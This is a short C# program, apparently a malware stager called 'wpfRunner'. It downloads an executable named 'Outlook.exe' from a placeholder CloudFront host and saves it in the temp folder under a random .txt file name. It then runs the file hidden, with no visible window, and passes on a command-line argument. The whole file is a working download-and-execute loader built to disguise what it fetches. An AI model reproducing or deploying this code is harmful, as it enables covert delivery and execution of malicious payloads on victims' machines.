using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: wpfRunner.exe <arg>");
            return;
        }

        string remoteUrl = "http://xxx.cloudfront.net/Outlook.exe"; // update
        string tempDirectory = Path.GetTempPath();
        string tempExePath = Path.Combine(tempDirectory, "mldabcdlsdewiv.txt");

        try
        {
            using (WebClient client = new WebClient())
            {
                await client.DownloadFileTaskAsync(new Uri(remoteUrl), tempExePath);
            }

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = tempExePath,
                Arguments = args[0], 
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to download and run the executable: {ex.Message}");
        }
    }
}
